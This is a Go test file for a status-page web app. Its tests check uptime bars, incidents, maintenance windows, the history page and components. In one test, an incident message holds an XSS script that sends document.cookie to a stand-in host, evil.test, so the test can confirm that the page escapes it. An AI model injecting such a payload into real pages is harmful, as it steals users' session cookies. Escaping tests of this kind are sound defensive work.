package web

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/sorin-work/status-page/internal/incident"
	"github.com/sorin-work/status-page/internal/maintenance"
	"github.com/sorin-work/status-page/internal/monitor"
	"github.com/sorin-work/status-page/internal/store"
)

func TestStatusPageBars(t *testing.T) {
	srv, st := newTestServer(t)
	ctx := context.Background()
	comp, _ := st.CreateComponent(ctx, store.Component{Name: "API"})
	m := addMonitor(t, st, "api")
	m.ComponentID = comp.ID
	if _, err := st.UpdateMonitor(ctx, m); err != nil {
		t.Fatal(err)
	}
	if err := st.RecordCheck(ctx, monitor.Result{MonitorID: m.ID, CheckedAt: time.Now(), Up: true}); err != nil {
		t.Fatal(err)
	}
	body := get(t, srv, "/").Body.String()
	if n := strings.Count(body, `class="bar `); n != 90 {
		t.Errorf("%d bars, want 90", n)
	}
	if n := strings.Count(body, `class="bar up"`); n != 1 {
		t.Errorf("%d green bars, want 1", n)
	}
	if !strings.Contains(body, "100.00% uptime") {
		t.Error("missing 90 day uptime")
	}
	if !strings.Contains(body, `<span class="tip"><strong>`) {
		t.Error("bars have no tooltips")
	}
}

func TestStatusPageActiveIncident(t *testing.T) {
	srv, st := newTestServer(t)
	ctx := context.Background()
	comp, _ := st.CreateComponent(ctx, store.Component{Name: "Checkout"})
	_, err := st.CreateIncident(ctx, incident.Incident{
		Title: "Card payments failing", Status: incident.StatusIdentified, Impact: incident.ImpactMajor, ComponentID: comp.ID,
	}, "The card processor is returning errors.")
	if err != nil {
		t.Fatal(err)
	}
	body := get(t, srv, "/").Body.String()
	if !strings.Contains(body, "<title>Major outage · Acme Status</title>") {
		t.Error("page title does not show the outage")
	}
	for _, want := range []string{"Card payments failing", "The card processor is returning errors.", "Major outage"} {
		if !strings.Contains(body, want) {
			t.Errorf("status page is missing %q", want)
		}
	}
}

func TestStatusPagePastIncidents(t *testing.T) {
	srv, st := newTestServer(t)
	ctx := context.Background()
	if body := get(t, srv, "/").Body.String(); !strings.Contains(body, "No incidents reported") {
		t.Error("missing empty state for past incidents")
	}
	for _, title := range []string{"DNS outage", "Slow search"} {
		inc, err := st.CreateIncident(ctx, incident.Incident{Title: title, Status: incident.StatusInvestigating, Impact: incident.ImpactMinor, StartedAt: time.Now().Add(-2 * time.Hour)}, "Looking.")
		if err != nil {
			t.Fatal(err)
		}
		if _, err := st.AddIncidentUpdate(ctx, inc.ID, incident.StatusResolved, "All good now.", time.Now().Add(-time.Hour)); err != nil {
			t.Fatal(err)
		}
	}
	body := get(t, srv, "/").Body.String()
	for _, want := range []string{"DNS outage", "Slow search", "All good now.", "lasted 1h"} {
		if !strings.Contains(body, want) {
			t.Errorf("status page is missing %q", want)
		}
	}
}

func TestPublicIncidentPage(t *testing.T) {
	srv, st := newTestServer(t)
	ctx := context.Background()
	comp, _ := st.CreateComponent(ctx, store.Component{Name: "Search"})
	inc, err := st.CreateIncident(ctx, incident.Incident{Title: "Search is slow", Status: incident.StatusInvestigating, Impact: incident.ImpactMinor, ComponentID: comp.ID}, "Investigating slow queries.")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := st.AddIncidentUpdate(ctx, inc.ID, incident.StatusMonitoring, "An index was added.", time.Time{}); err != nil {
		t.Fatal(err)
	}
	rec := get(t, srv, "/incidents/"+itoa(inc.ID))
	if rec.Code != http.StatusOK {
		t.Fatalf("got %d", rec.Code)
	}
	body := rec.Body.String()
	for _, want := range []string{"Search is slow", "affects Search", "Investigating slow queries.", "An index was added."} {
		if !strings.Contains(body, want) {
			t.Errorf("incident page is missing %q", want)
		}
	}
	if strings.Contains(body, "csrf") {
		t.Error("public page should not contain admin forms")
	}
	if rec := get(t, srv, "/incidents/999"); rec.Code != http.StatusNotFound {
		t.Errorf("missing incident: %d", rec.Code)
	}
}

func TestStatusPageMaintenance(t *testing.T) {
	srv, st := newTestServer(t)
	ctx := context.Background()
	db, _ := st.CreateComponent(ctx, store.Component{Name: "Database"})
	m := addMonitor(t, st, "db")
	m.ComponentID = db.ID
	if _, err := st.UpdateMonitor(ctx, m); err != nil {
		t.Fatal(err)
	}
	if err := st.SetMonitorStatus(ctx, m.ID, monitor.StatusDown); err != nil {
		t.Fatal(err)
	}
	now := time.Now()
	for _, w := range []maintenance.Window{
		{Title: "Failover test", ComponentID: db.ID, StartsAt: now.Add(-time.Minute), EndsAt: now.Add(time.Hour)},
		{Title: "Network upgrade", StartsAt: now.Add(48 * time.Hour), EndsAt: now.Add(50 * time.Hour)},
	} {
		if _, err := st.CreateMaintenance(ctx, w); err != nil {
			t.Fatal(err)
		}
	}
	body := get(t, srv, "/").Body.String()
	for _, want := range []string{"Failover test", "In progress", "Network upgrade", "Scheduled", "Under maintenance", "Scheduled maintenance in progress"} {
		if !strings.Contains(body, want) {
			t.Errorf("status page is missing %q", want)
		}
	}
	if strings.Contains(body, "Major outage") {
		t.Error("component under maintenance shown as an outage")
	}
}

func TestIncidentMessagesAreEscaped(t *testing.T) {
	srv, st := newTestServer(t)
	inc, err := st.CreateIncident(context.Background(), incident.Incident{
		Title: "Login problems", Status: incident.StatusInvestigating, Impact: incident.ImpactMinor,
	}, "Investigating.\n<script>document.location='https://evil.test/?c='+document.cookie</script>")
	if err != nil {
		t.Fatal(err)
	}
	for _, path := range []string{"/", "/incidents/" + itoa(inc.ID)} {
		body := get(t, srv, path).Body.String()
		if strings.Contains(body, "<script>document") {
			t.Errorf("%s: incident message rendered as HTML", path)
		}
		if !strings.Contains(body, "Investigating.<br>&lt;script&gt;") {
			t.Errorf("%s: message not escaped as expected", path)
		}
	}
}

func TestStatusPageShowsLatestPastIncidents(t *testing.T) {
	srv, st := newTestServer(t)
	ctx := context.Background()
	start := time.Now().AddDate(0, 0, -30)
	for i := range pastIncidentLimit + 2 {
		inc, err := st.CreateIncident(ctx, incident.Incident{Title: fmt.Sprintf("Outage #%02d", i), Status: incident.StatusInvestigating, Impact: incident.ImpactMinor, StartedAt: start.AddDate(0, 0, i)}, "x")
		if err != nil {
			t.Fatal(err)
		}
		if _, err := st.AddIncidentUpdate(ctx, inc.ID, incident.StatusResolved, "done", start.AddDate(0, 0, i).Add(time.Hour)); err != nil {
			t.Fatal(err)
		}
	}
	body := get(t, srv, "/").Body.String()
	newest, older := strings.Index(body, "Outage #11"), strings.Index(body, "Outage #10")
	if newest < 0 || older < 0 || newest > older {
		t.Error("the newest incidents are missing or not listed first")
	}
	if strings.Contains(body, "Outage #00") || strings.Contains(body, "Outage #01") {
		t.Error("the oldest incidents are listed instead of the latest")
	}
}

func TestHistoryPage(t *testing.T) {
	srv, st := newTestServer(t)
	ctx := context.Background()
	if body := get(t, srv, "/history").Body.String(); !strings.Contains(body, "No incidents reported") {
		t.Error("missing empty state")
	}
	for _, d := range []struct {
		title string
		at    time.Time
	}{
		{"March outage", time.Date(2026, 3, 10, 9, 0, 0, 0, time.UTC)},
		{"May outage", time.Date(2026, 5, 2, 9, 0, 0, 0, time.UTC)},
		{"Open incident", time.Date(2026, 5, 3, 9, 0, 0, 0, time.UTC)},
	} {
		inc, err := st.CreateIncident(ctx, incident.Incident{Title: d.title, Status: incident.StatusInvestigating, Impact: incident.ImpactMinor, StartedAt: d.at}, "x")
		if err != nil {
			t.Fatal(err)
		}
		if d.title != "Open incident" {
			if _, err := st.AddIncidentUpdate(ctx, inc.ID, incident.StatusResolved, "done", d.at.Add(time.Hour)); err != nil {
				t.Fatal(err)
			}
		}
	}
	body := get(t, srv, "/history").Body.String()
	may, march := strings.Index(body, "May 2026"), strings.Index(body, "March 2026")
	if may < 0 || march < 0 || may > march {
		t.Errorf("months missing or out of order")
	}
	if strings.Contains(body, "Open incident") {
		t.Error("unresolved incident listed in the history")
	}
}

func TestStatusPageEmpty(t *testing.T) {
	srv, _ := newTestServer(t)
	body := get(t, srv, "/").Body.String()
	if !strings.Contains(body, "Nothing to report yet") || !strings.Contains(body, "Status unknown") {
		t.Error("unexpected empty status page")
	}
}

func TestStatusPageComponents(t *testing.T) {
	srv, st := newTestServer(t)
	ctx := context.Background()
	api, _ := st.CreateComponent(ctx, store.Component{Name: "API", Description: "REST and webhooks"})
	web, _ := st.CreateComponent(ctx, store.Component{Name: "Website"})
	for _, tc := range []struct {
		comp   int64
		status monitor.Status
	}{{api.ID, monitor.StatusUp}, {api.ID, monitor.StatusDown}, {web.ID, monitor.StatusUp}} {
		m := addMonitor(t, st, "m")
		m.ComponentID = tc.comp
		if _, err := st.UpdateMonitor(ctx, m); err != nil {
			t.Fatal(err)
		}
		if err := st.SetMonitorStatus(ctx, m.ID, tc.status); err != nil {
			t.Fatal(err)
		}
	}
	body := get(t, srv, "/").Body.String()
	for _, want := range []string{"Some systems are experiencing issues", "REST and webhooks", "Partial outage", "Operational"} {
		if !strings.Contains(body, want) {
			t.Errorf("status page is missing %q", want)
		}
	}
}
